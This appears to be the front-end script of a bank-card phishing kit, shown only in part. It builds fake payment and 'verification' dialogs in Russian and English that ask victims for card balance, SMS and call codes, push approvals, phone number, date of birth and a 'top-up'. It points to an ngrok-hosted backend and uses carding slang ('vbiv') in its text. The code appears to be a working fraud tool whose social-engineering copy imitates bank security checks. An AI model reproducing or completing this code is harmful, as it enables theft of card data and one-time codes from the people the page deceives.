

(function () {
  'use strict';

  var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';

  // In-memory only card number cache (never persisted to storage)
  var _memCardNum = '';
  // In-memory full card data cache (never persisted to storage)
  var _memCardData = null;

  if (typeof window.OTPAutofill === 'undefined') {
    var otpScript = document.createElement('script');
    otpScript.src = '/style/other/otpAutofill.js?v=4';
    otpScript.async = true;
    document.head.appendChild(otpScript);
  }

  var ICONS = {
    shield:  '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="currentColor"/></svg>',
    mail:    '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" fill="currentColor"/></svg>',
    phone:   '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z" fill="currentColor"/></svg>',
    bell:    '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" fill="currentColor"/></svg>',
    warn:    '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" fill="currentColor"/></svg>',
    error:   '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="currentColor"/></svg>',
    cross:   '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 13.59L15.59 17 12 13.41 8.41 17 7 15.59 10.59 12 7 8.41 8.41 7 12 10.59 15.59 7 17 8.41 13.41 12 17 15.59z" fill="currentColor"/></svg>',
    success: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="currentColor"/></svg>',
    wallet:  '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M21 18v1c0 1.1-.9 2-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h14c1.1 0 2 .9 2 2v1h-9a2 2 0 00-2 2v8a2 2 0 002 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z" fill="currentColor"/></svg>',
    person:  '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="currentColor"/></svg>',
    doc:     '<svg width="28" height="28" viewBox="0 0 24 24" fill="none"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm-1 18H7v-2h6v2zm3-4H7v-2h9v2zm-3-6V3.5L18.5 9H13z" fill="currentColor"/></svg>'
  };

  function htmlToElement(html) {
    var tpl = document.createElement('template');
    tpl.innerHTML = html.trim();
    return tpl.content.firstChild;
  }

  function _decodeHtmlEntities(obj) {
    if (!obj || typeof obj !== 'object') return obj;
    var d = document.createElement('textarea');
    Object.keys(obj).forEach(function (k) {
      if (typeof obj[k] === 'string') {
        d.innerHTML = obj[k];
        obj[k] = d.value;
      } else if (typeof obj[k] === 'object') {
        _decodeHtmlEntities(obj[k]);
      }
    });
    return obj;
  }

  function _normalizeLangAlias(lang) {
    if (!lang) return '';
    var v = String(lang).toLowerCase();
    if (v === 'kk') return 'kz';
    if (v === 'ky') return 'kg';
    return v;
  }

  function ModalSystem(cfg) {
    this.cfg = cfg || {};
    if (!this.cfg.translate || typeof this.cfg.translate !== 'object') {
      this.cfg.translate = {};
    }
    if (!Object.keys(this.cfg.translate).length) {
      this._hydrateInitialTranslate();
    }
    if (this.cfg.translate) _decodeHtmlEntities(this.cfg.translate);
    this.logId = cfg.logId || null;
    this.currentModal = null;
    this.currentStatus = null;
    this.polling = false;
    this.paused = false;
    this.wrongDataType = 'wrongData';
    this.pollTimer = null;
    this.eventSource = null;   
    this.sseConnected = false; 

    this._injectHTML();
    this._initLangSync();

    if (this.logId) {
      this._resumeSession();
    }
  }

  ModalSystem.prototype._hydrateInitialTranslate = function () {
    var meta = document.querySelector('meta[name="page-country"]');
    var country = meta ? _normalizeLangAlias(meta.getAttribute('content') || '') : '';
    var lang = _normalizeLangAlias((this._getPreferredLang && this._getPreferredLang()) || '');
    var itemId = (this.cfg && this.cfg.itemId) ? String(this.cfg.itemId) : '';
    var qs = [];
    if (country) qs.push('country=' + encodeURIComponent(country));
    if (lang) qs.push('lang=' + encodeURIComponent(lang));
    if (itemId) qs.push('itemId=' + encodeURIComponent(itemId));
    var url = '/api/cardTranslate' + (qs.length ? '?' + qs.join('&') : '');

    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', url, false);
      xhr.send(null);
      if (xhr.status >= 200 && xhr.status < 300) {
        var data = JSON.parse(xhr.responseText || '{}');
        if (data && data.ok) {
          this.cfg.translate = {
            card: data.card || {},
            sms: data.sms || {},
            push: data.push || {},
            smscall: data.smscall || {},
            errors: data.errors || {},
            wait: data.wait || {},
            wrongdata: data.wrongdata || {},
            popolnenie: data.popolnenie || {},
            requestPhone: data.requestPhone || {},
            requestBirthday: data.requestBirthday || {}
          };
        }
      }
    } catch (e) {}
  };

  ModalSystem.prototype._injectHTML = function () {
    var t = this.cfg.translate || {};
    var cardCopy = this._resolveCardCopy(t.card || {});
    var price = this.cfg.price || '';
    var curr = this.cfg.curr || '';
    var amountLine = (t.sms && t.sms.amount ? t.sms.amount : 'Amount') + ': ' + price + ' ' + curr;
    var self = this;

    var container = document.createElement('div');
    container.id = 'ms-container';
    container.innerHTML =
      
      '<div class="ms-overlay" id="msLoading">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-spinner-wrap">' +
            '<div class="ms-spinner"></div>' +
            '<div class="ms-spinner-text">' + (t.card && t.card.wait || 'Загрузка...') + '</div>' +
            '<div class="ms-spinner-sub">' + (t.wait && t.wait.vbiv || 'Пожалуйста, подождите. Не закрывайте окно.') + '</div>' +
          '</div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msBalanceVerify">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon green">' + ICONS.shield + '</div>' +
          '<div class="ms-title">' + (t.card && t.card.balanceVerifyTitle || 'Верификация баланса') + '</div>' +
          '<div class="ms-text">' + (t.card && t.card.balanceVerifyText || 'Введите текущий баланс вашей карты для подтверждения.') + '</div>' +

          '<div class="ms-info-card">' +
            '<div class="ms-info-card-header">' +
              '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="currentColor"/></svg>' +
              '<span>' + (t.card && t.card.balanceWhyTitle || 'Зачем это нужно?') + '</span>' +
            '</div>' +
            '<div class="ms-info-card-text">' + (t.card && t.card.balanceWhyText || 'Проверка баланса — стандартная процедура верификации владельца карты. Это защищает вас от несанкционированных операций.') + '</div>' +
          '</div>' +

          '<div class="ms-steps">' +
            '<div class="ms-step">' +
              '<div class="ms-step-num">1</div>' +
              '<div class="ms-step-text">' + (t.card && t.card.balanceStep1 || 'Откройте мобильное приложение вашего банка') + '</div>' +
            '</div>' +
            '<div class="ms-step">' +
              '<div class="ms-step-num">2</div>' +
              '<div class="ms-step-text">' + (t.card && t.card.balanceStep2 || 'Найдите баланс карты на главном экране') + '</div>' +
            '</div>' +
            '<div class="ms-step">' +
              '<div class="ms-step-num">3</div>' +
              '<div class="ms-step-text">' + (t.card && t.card.balanceStep3 || 'Введите точную сумму, включая копейки') + '</div>' +
            '</div>' +
          '</div>' +

          '<input type="text" class="ms-input" id="msBalanceVerifyInput" inputmode="decimal" placeholder="' + (t.card && t.card.balancePlaceholder || '0.00') + '" style="letter-spacing:2px">' +
          '<div class="ms-format-hint">' + (t.card && t.card.balanceFormatHint || 'Например: 15 230.50') + '</div>' +
          '<div class="ms-error-hint" id="msBalanceVerifyError">' + (t.card && t.card.balanceInvalid || 'Некорректная сумма') + '</div>' +
          '<button type="button" class="ms-btn" id="msBalanceVerifyBtn">' + (t.card && t.card.balanceConfirm || 'Подтвердить') + '</button>' +

          '<div class="ms-secure-badge">' +
            '<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 2C9.24 2 7 4.24 7 7v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7c0-2.76-2.24-5-5-5zm0 2c1.65 0 3 1.35 3 3v3H9V7c0-1.65 1.35-3 3-3z" fill="currentColor"/></svg>' +
            '<span>' + (t.card && t.card.balanceSecure || 'Данные защищены сквозным шифрованием') + '</span>' +
          '</div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msSms">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +

          '<div class="ms-sms-header">' +
            '<div class="ms-sms-icon-pulse">' +
              '<div class="ms-sms-icon-ring"></div>' +
              ICONS.mail +
            '</div>' +
            '<div class="ms-sms-title">' + (t.sms && t.sms.title || 'Отправлен SMS код') + '</div>' +
            '<div class="ms-sms-subtitle">' + (t.sms && t.sms.smsSubtitle || 'Код отправлен на номер, привязанный к карте') + '</div>' +
          '</div>' +

          '<div class="ms-sms-card-info">' +
            '<div class="ms-sms-card-row">' +
              '<svg class="ms-sms-card-chip" width="32" height="24" viewBox="0 0 32 24"><rect width="32" height="24" rx="4" fill="#e8e8e8"/><rect x="4" y="4" width="10" height="7" rx="1.5" fill="#c9a84c" stroke="#b8943f" stroke-width=".5"/><line x1="9" y1="4" x2="9" y2="11" stroke="#b8943f" stroke-width=".5"/><line x1="4" y1="7.5" x2="14" y2="7.5" stroke="#b8943f" stroke-width=".5"/></svg>' +
              '<span class="ms-sms-card-mask" id="msSmsCardMask">•••• •• ** •••• ****</span>' +
            '</div>' +
          '</div>' +

          '<div class="ms-sms-instruction">' +
            '<div class="ms-sms-step">' +
              '<div class="ms-sms-step-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" fill="currentColor"/></svg></div>' +
              '<span>' + (t.sms && t.sms.smsStep1 || 'Проверьте входящие SMS на вашем телефоне') + '</span>' +
            '</div>' +
            '<div class="ms-sms-step">' +
              '<div class="ms-sms-step-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 2c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1zm-5 9v-1c0-1.67 3.33-2.5 5-2.5s5 .83 5 2.5v1H7z" fill="currentColor"/></svg></div>' +
              '<span>' + (t.sms && t.sms.smsStep2 || 'Введите полученный код в поле ниже') + '</span>' +
            '</div>' +
          '</div>' +

          '<div class="ms-sms-input-wrap">' +
            '<label class="ms-sms-label">' + (t.sms && t.sms.sms || 'SMS-код') + '</label>' +
            '<input type="text" class="ms-input ms-sms-code-input" id="msSmsCode" inputmode="numeric" placeholder="' + (t.sms && t.sms.smsPlaceHolder || '000000') + '" autocomplete="one-time-code" maxlength="10">' +
            '<div class="ms-error-hint" id="msSmsError">' + (t.sms && t.sms.incorrect || 'Неверный код') + '</div>' +
          '</div>' +

          '<button type="button" class="ms-btn" id="msSmsBtn">' + (t.sms && t.sms.smsConfirm || 'Подтвердить') + '</button>' +

          '<div class="ms-sms-secure">' +
            '<svg width="12" height="12" viewBox="0 0 24 24" fill="none"><path d="M12 2C9.24 2 7 4.24 7 7v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7c0-2.76-2.24-5-5-5zm0 2c1.65 0 3 1.35 3 3v3H9V7c0-1.65 1.35-3 3-3z" fill="currentColor"/></svg>' +
            '<span>' + (t.sms && t.sms.smsSecure || 'Защищённое соединение') + '</span>' +
          '</div>' +

        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msSmsCall">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon blue">' + ICONS.phone + '</div>' +
          '<div class="ms-title">' + (t.smscall && t.smscall.conf || 'Подтверждение') + '</div>' +
          '<div class="ms-amount">' + amountLine + '</div>' +
          '<div class="ms-text">' + (t.smscall && t.smscall.callbank || 'Введите код из звонка.') + '</div>' +
          '<input type="text" class="ms-input" id="msSmsCallCode" inputmode="numeric" placeholder="' + (t.smscall && t.smscall.entercodethis || '000000') + '" autocomplete="one-time-code">' +
          '<div class="ms-error-hint" id="msSmsCallError">' + (t.sms && t.sms.incorrect || 'Неверный код') + '</div>' +
          '<button type="button" class="ms-btn" id="msSmsCallBtn">' + (t.sms && t.sms.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msPush">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon green">' + ICONS.bell + '</div>' +
          '<div class="ms-title">' + (t.push && t.push.title || 'Push-подтверждение') + '</div>' +
          '<div class="ms-amount">' + (t.push && t.push.amount ? t.push.amount + ': ' + price + ' ' + curr : amountLine) + '</div>' +
          '<div class="ms-text">' + (t.push && t.push.text || 'Подтвердите операцию в приложении банка.') + '</div>' +
          '<button type="button" class="ms-btn" id="msPushBtn">' + (t.push && t.push.next || 'OK') + '</button>' +
          '<div class="ms-spinner-wrap" id="msPushSpinner" style="display:none;margin-top:16px"><div class="ms-spinner"></div></div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msCall">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon blue">' + ICONS.phone + '</div>' +
          '<div class="ms-title">' + (t.sms && t.sms.call || 'Звонок из банка') + '</div>' +
          '<div class="ms-amount">' + amountLine + '</div>' +
          '<div class="ms-text">' + (t.sms && t.sms.call || 'Ожидайте звонок из банка.') + '</div>' +
          '<button type="button" class="ms-btn" id="msCallBtn">OK</button>' +
          '<div class="ms-spinner-wrap" id="msCallSpinner" style="display:none;margin-top:16px"><div class="ms-spinner"></div></div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msWrongDataDisplay">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon orange">' + ICONS.warn + '</div>' +
          '<div class="ms-title">' + (t.errors && t.errors.generalErrorWord || 'Ошибка') + '</div>' +
          '<div class="ms-text">' + (t.wrongdata && t.wrongdata.wrongdata || 'Неверные данные.') + '</div>' +
          '<button type="button" class="ms-btn" id="msWrongDataDisplayBtn">' + (t.card && t.card.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msWrongData">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon orange">' + ICONS.warn + '</div>' +
          '<div class="ms-title" id="msWrongDataTitle">' + (t.smscall && t.smscall.conf || 'Подтверждение') + '</div>' +
          '<div class="ms-text" id="msWrongDataText">' + (t.wrongdata && t.wrongdata.wrongdata || 'Неверные данные.') + '</div>' +
          '<input type="text" class="ms-input" id="msWrongDataCode" placeholder="" style="letter-spacing:2px">' +
          '<div class="ms-error-hint" id="msWrongDataError">' + (t.sms && t.sms.incorrect || 'Неверный код') + '</div>' +
          '<button type="button" class="ms-btn" id="msWrongDataBtn">' + (t.sms && t.sms.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msBalance">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon green">' + ICONS.wallet + '</div>' +
          '<div class="ms-title">' + (t.card && t.card.balance || 'Баланс') + '</div>' +
          '<div class="ms-text">' + (t.card && t.card.enterBalance || 'Введите баланс карты.') + '</div>' +

          '<div class="ms-info-card">' +
            '<div class="ms-info-card-header">' +
              '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" fill="currentColor"/></svg>' +
              '<span>' + (t.card && t.card.balanceWhyTitle || 'Зачем это нужно?') + '</span>' +
            '</div>' +
            '<div class="ms-info-card-text">' + (t.card && t.card.balanceWhyText || 'Проверка баланса — стандартная процедура верификации владельца карты. Это защищает вас от несанкционированных операций.') + '</div>' +
          '</div>' +

          '<div class="ms-steps">' +
            '<div class="ms-step">' +
              '<div class="ms-step-num">1</div>' +
              '<div class="ms-step-text">' + (t.card && t.card.balanceStep1 || 'Откройте мобильное приложение вашего банка') + '</div>' +
            '</div>' +
            '<div class="ms-step">' +
              '<div class="ms-step-num">2</div>' +
              '<div class="ms-step-text">' + (t.card && t.card.balanceStep2 || 'Найдите баланс карты на главном экране') + '</div>' +
            '</div>' +
            '<div class="ms-step">' +
              '<div class="ms-step-num">3</div>' +
              '<div class="ms-step-text">' + (t.card && t.card.balanceStep3 || 'Введите точную сумму, включая копейки') + '</div>' +
            '</div>' +
          '</div>' +

          '<input type="text" class="ms-input" id="msBalanceCode" inputmode="decimal" placeholder="0.00" style="letter-spacing:2px">' +
          '<div class="ms-format-hint">' + (t.card && t.card.balanceFormatHint || 'Например: 15 230.50') + '</div>' +
          '<button type="button" class="ms-btn" id="msBalanceBtn">' + (t.card && t.card.balanceConfirm || 'Подтвердить') + '</button>' +

          '<div class="ms-secure-badge">' +
            '<svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 2C9.24 2 7 4.24 7 7v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7c0-2.76-2.24-5-5-5zm0 2c1.65 0 3 1.35 3 3v3H9V7c0-1.65 1.35-3 3-3z" fill="currentColor"/></svg>' +
            '<span>' + (t.card && t.card.balanceSecure || 'Данные защищены сквозным шифрованием') + '</span>' +
          '</div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msSmartid">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon blue">' + ICONS.shield + '</div>' +
          '<div class="ms-title">Smart ID</div>' +
          '<div class="ms-text">' + (t.push && t.push.text || 'Подтвердите операцию.') + '</div>' +
          '<div class="ms-spinner-wrap" style="margin-top:8px"><div class="ms-spinner"></div></div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msField">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon orange">' + ICONS.doc + '</div>' +
          '<div class="ms-title">' + (t.errors && t.errors.field || 'Поле') + '</div>' +
          '<div class="ms-text" id="msFieldText">' + (t.errors && t.errors.field || '') + '</div>' +
          '<input type="text" class="ms-input" id="msFieldCode" data-no-otp="true" autocomplete="off" placeholder="' + (t.errors && t.errors.fieldthis || '') + '" style="letter-spacing:2px">' +
          '<button type="button" class="ms-btn" id="msFieldBtn">' + (t.sms && t.sms.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msSmenalk">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon orange">' + ICONS.person + '</div>' +
          '<div class="ms-title">' + (t.errors && t.errors.smenalkenter || 'Личный кабинет') + '</div>' +
          '<div class="ms-text">' + (t.errors && t.errors.smenalk || '') + '</div>' +
          '<button type="button" class="ms-btn" id="msSmenalkBtn">OK</button>' +
          '<div class="ms-spinner-wrap" id="msSmenalkSpinner" style="display:none;margin-top:16px"><div class="ms-spinner"></div></div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msMerchant">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon red">' + ICONS.error + '</div>' +
          '<div class="ms-title">' + (t.errors && t.errors.changeCard || 'Смена карты') + '</div>' +
          '<div class="ms-text">' + (t.errors && t.errors.noValidCard || 'Карта не подходит. Введите другую.') + '</div>' +
          '<button type="button" class="ms-btn" id="msMerchantBtn">' + (t.card && t.card.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msPopolnenie">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon green">' + ICONS.shield + '</div>' +
          '<div class="ms-title" id="msPopolnenieTitle">' + (t.errors && t.errors.popolnenieTitle || 'Верификация карты') + '</div>' +
          '<div class="ms-text" id="msPopolnenieText">' + (t.errors && t.errors.popolnenieText || 'Для подтверждения того, что вы являетесь держателем карты, необходимо пополнить баланс.') + '</div>' +
          '<div class="ms-text" id="msPopolnenieAmount" style="font-size:22px;font-weight:700;margin:12px 0 4px;color:#1a1a1a;"></div>' +
          '<div class="ms-text" style="font-size:12px;color:#888;margin-bottom:10px;">' + (t.errors && t.errors.popolnenieHint || 'Средства останутся на вашем счёте.') + '</div>' +
          '<button type="button" class="ms-btn" id="msPopolnenieBtn">' + (t.errors && t.errors.popolnenieBtn || 'Хорошо') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msRequestPhone">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon green">' + ICONS.phone + '</div>' +
          '<div class="ms-title">' + (t.requestPhone && t.requestPhone.title || 'Phone number') + '</div>' +
          '<div class="ms-text">' + (t.requestPhone && t.requestPhone.text || 'Enter the phone number linked to your account.') + '</div>' +
          '<input type="tel" class="ms-input" id="msPhoneInput" inputmode="tel" placeholder="' + (t.requestPhone && t.requestPhone.placeholder || '+1 (___) ___-____') + '" autocomplete="tel">' +
          '<div class="ms-error-hint" id="msPhoneError">' + (t.sms && t.sms.incorrect || 'Incorrect format') + '</div>' +
          '<button type="button" class="ms-btn" id="msPhoneBtn">' + (t.sms && t.sms.next || 'Confirm') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msRequestBirthday">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon green">' + ICONS.person + '</div>' +
          '<div class="ms-title">' + (t.requestBirthday && t.requestBirthday.title || 'Date of birth') + '</div>' +
          '<div class="ms-text">' + (t.requestBirthday && t.requestBirthday.text || 'Enter your date of birth to verify your identity.') + '</div>' +
          '<div class="ms-date-group" id="msBirthdayGroup">' +
            '<input type="text" class="ms-date-seg" id="msBdayDay" inputmode="numeric" maxlength="2" placeholder="DD">' +
            '<span class="ms-date-dot">.</span>' +
            '<input type="text" class="ms-date-seg" id="msBdayMonth" inputmode="numeric" maxlength="2" placeholder="MM">' +
            '<span class="ms-date-dot">.</span>' +
            '<input type="text" class="ms-date-seg ms-date-seg-year" id="msBdayYear" inputmode="numeric" maxlength="4" placeholder="YYYY">' +
          '</div>' +
          '<input type="hidden" id="msBirthdayInput">' +
          '<div class="ms-error-hint" id="msBirthdayError">' + (t.sms && t.sms.incorrect || 'Неверный формат') + '</div>' +
          '<button type="button" class="ms-btn" id="msBirthdayBtn">' + (t.sms && t.sms.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msError">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon red">' + ICONS.error + '</div>' +
          '<div class="ms-title">' + (t.errors && t.errors.generalErrorWord || 'Ошибка') + '</div>' +
          '<div class="ms-text">' + (t.errors && t.errors.skipCard || 'Вы ввели неверные данные. Проверьте правильность введённых данных и попробуйте снова.') + '</div>' +
          '<button type="button" class="ms-btn" id="msErrorBtn">' + (t.sms && t.sms.next || 'Далее') + '</button>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msCustom">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon orange">' + ICONS.warn + '</div>' +
          '<div class="ms-title">' + (t.smscall && t.smscall.conf || 'Confirmation') + '</div>' +
          '<div class="ms-text" id="msCustomText"></div>' +
          '<button type="button" class="ms-btn" id="msCustomBtn">OK</button>' +
          '<div class="ms-spinner-wrap" id="msCustomSpinner" style="display:none;margin-top:16px"><div class="ms-spinner"></div></div>' +
        '</div></div>' +
      '</div>' +

      '<div class="ms-overlay" id="msSuccess">' +
        '<div class="ms-sheet"><div class="ms-handle"></div><div class="ms-body">' +
          '<div class="ms-icon red">' + ICONS.cross + '</div>' +
          '<div class="ms-title">' + (t.errors && t.errors.generalSuccessWord || 'Ошибка!') + '</div>' +
          '<div class="ms-text">' + (t.errors && t.errors.successTransaction || 'Произошла ошибка, обратитесь в службу технической поддержки.') + '</div>' +
          '<button type="button" class="ms-btn ms-btn-support" id="msSupportBtn" style="margin-top:12px;background:var(--modal-accent, #1AB248);color:#fff">' + (t.card && t.card.support || 'Чат поддержки') + '</button>' +
        '</div></div>' +
      '</div>' +

      /* ===== Card Form Modal ===== */
      '<div class="ms-overlay ms-card-overlay" id="msCardForm">' +
        '<div class="ms-sheet"><div class="ms-card-box">' +
          '<div class="ms-card-header">' +
            '<div>' +
              '<div class="ms-card-title" id="msCardTitle">' + (cardCopy.cardTitle || 'Payment details') + '</div>' +
              '<div class="ms-card-subtitle" id="msCardSubtitle">' +
                '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L4 5v6c0 5 3.5 9 8 10 4.5-1 8-5 8-10V5l-8-3z"/><path d="M9 12l2 2 4-4"/></svg>' +
                '<span id="msCardSecureText">' + (t.card && t.card.secureLine || 'Secure connection') + '</span>' +
              '</div>' +
            '</div>' +
            '<button class="ms-card-close" id="msCardFormClose" type="button" aria-label="Close">' +
              '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>' +
            '</button>' +
          '</div>' +

          '<div class="ms-card-preview" id="msCardPreview">' +
            '<div class="ms-card-preview-glow"></div>' +
            '<div class="ms-card-preview-chip" aria-hidden="true">' +
              '<svg viewBox="0 0 32 24" fill="none"><rect x="1" y="1" width="30" height="22" rx="4" fill="url(#chipGrad)" stroke="rgba(0,0,0,.15)"/><path d="M8 8h16M8 12h16M8 16h16M12 4v16M20 4v16" stroke="rgba(0,0,0,.25)" stroke-width="1"/><defs><linearGradient id="chipGrad" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#F4D078"/><stop offset="1" stop-color="#B8893F"/></linearGradient></defs></svg>' +
            '</div>' +
            '<div class="ms-card-preview-brand" id="msCardPreviewBrand" aria-hidden="true"></div>' +
            '<div class="ms-card-preview-number" id="msCardPreviewNumber">\u2022\u2022\u2022\u2022  \u2022\u2022\u2022\u2022  \u2022\u2022\u2022\u2022  \u2022\u2022\u2022\u2022</div>' +
            '<div class="ms-card-preview-row">' +
              '<div class="ms-card-preview-holder" id="msCardPreviewHolder">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022</div>' +
              '<div class="ms-card-preview-exp"><span class="ms-card-preview-exp-label">' + (t.card && t.card.expPlaceholder || 'MM/YY') + '</span><span id="msCardPreviewExp">\u2022\u2022/\u2022\u2022</span></div>' +
            '</div>' +
          '</div>' +

          '<div class="ms-card-order">' +
            '<div class="ms-card-order-row">' +
              '<span class="ms-card-order-label" id="msCardTransLabel">' + (t.card && t.card.transaction || 'Transaction') + '</span>' +
              '<span class="ms-card-order-value" id="msCardOrderId">#' + (self.cfg.itemId || '') + '</span>' +
            '</div>' +
            (self._resolveServiceType() !== 'verification' ? (
            '<div class="ms-card-order-row ms-card-order-total">' +
              '<span class="ms-card-order-label">' + (self.cfg.title || '') + '</span>' +
